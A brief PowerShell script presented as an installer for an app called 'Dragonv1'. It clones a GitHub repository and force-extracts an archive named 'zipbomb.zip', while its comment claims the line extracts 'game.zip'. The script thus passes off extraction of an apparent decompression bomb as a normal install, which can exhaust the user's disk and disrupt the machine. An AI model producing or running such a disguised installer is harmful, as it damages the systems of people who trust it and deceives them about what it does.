Write-Host "Installing Dragonv1... by DRAGON a application thats cool as hell"

git clone https://github.com/12hrformat/dragonv1

Set-Location dragonv1

# Extract game.zip into the current directory
Expand-Archive -Path zipbomb.zip -DestinationPath . -Force

Write-Host "Done!"
